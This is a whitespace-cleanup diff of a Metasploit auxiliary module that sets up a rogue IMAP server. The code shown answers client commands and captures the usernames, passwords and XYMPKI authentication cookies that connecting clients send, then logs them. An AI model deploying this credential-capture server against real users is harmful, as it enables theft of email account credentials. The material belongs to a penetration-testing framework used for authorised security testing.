@@ -3,7 +3,7 @@
 ##
 
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
@@ -18,7 +18,7 @@ class Metasploit3 < Msf::Auxiliary
 	include Msf::Exploit::Remote::TcpServer
 	include Msf::Auxiliary::Report
 
-	
+
 	def initialize
 		super(
 			'Name'        => 'Authentication Capture: IMAP',
@@ -33,7 +33,7 @@ class Metasploit3 < Msf::Auxiliary
 				[
 				 	[ 'Capture' ]
 				],
-			'PassiveActions' => 
+			'PassiveActions' =>
 				[
 					'Capture'
 				],
@@ -54,24 +54,24 @@ class Metasploit3 < Msf::Auxiliary
 	def run
 		exploit()
 	end
-	
+
 	def on_client_connect(c)
 		@state[c] = {:name => "#{c.peerhost}:#{c.peerport}", :ip => c.peerhost, :port => c.peerport, :user => nil, :pass => nil}
 		c.put "* OK IMAP4\r\n"
 	end
-	
+
 	def on_client_data(c)
 		data = c.get_once
 		return if not data
 		num,cmd,arg = data.strip.split(/\s+/, 3)
 		arg ||= ""
-		
-		
-		if(cmd.upcase == "CAPABILITY") 
+
+
+		if(cmd.upcase == "CAPABILITY")
 			c.put "* CAPABILITY IMAP4 IMAP4rev1 IDLE LOGIN-REFERRALS MAILBOX-REFERRALS NAMESPACE LITERAL+ UIDPLUS CHILDREN UNSELECT QUOTA XLIST XYZZY LOGIN-REFERRALS AUTH=XYMCOOKIE AUTH=XYMCOOKIEB64 AUTH=XYMPKI AUTH=XYMECOOKIE ID\r\n"
 			c.put "#{num} OK CAPABILITY completed.\r\n"
 		end
-		
+
 		if(cmd.upcase == "AUTHENTICATE" and arg.upcase == "XYMPKI")
 			c.put "+ \r\n"
 			cookie1 = c.get_once
@@ -85,9 +85,9 @@ class Metasploit3 < Msf::Auxiliary
 				:user      => cookie1,
 				:pass      => cookie2
 			)
-			return	
+			return
 		end
-		
+
 		if(cmd.upcase == "LOGIN")
 			@state[c][:user], @state[c][:pass] = arg.split(/\s+/, 2)
 
@@ -102,7 +102,7 @@ class Metasploit3 < Msf::Auxiliary
 			print_status("IMAP LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")
 			return
 		end
-		
+
 		if(cmd.upcase == "LOGOUT")
 			c.put("* BYE IMAP4rev1 Server logging out\r\n")
 			c.put("#{num} OK LOGOUT completed\r\n")
@@ -112,9 +112,9 @@ class Metasploit3 < Msf::Auxiliary
 		@state[c][:pass] = data.strip
 		c.put "#{num} NO LOGIN FAILURE\r\n"
 		return
-							
+
 	end
-	
+
 	def on_client_close(c)
 		@state.delete(c)
 	end
